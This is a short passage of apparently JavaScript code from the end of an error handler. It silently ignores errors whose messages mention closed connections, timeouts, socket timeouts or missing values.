if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return
    }
}
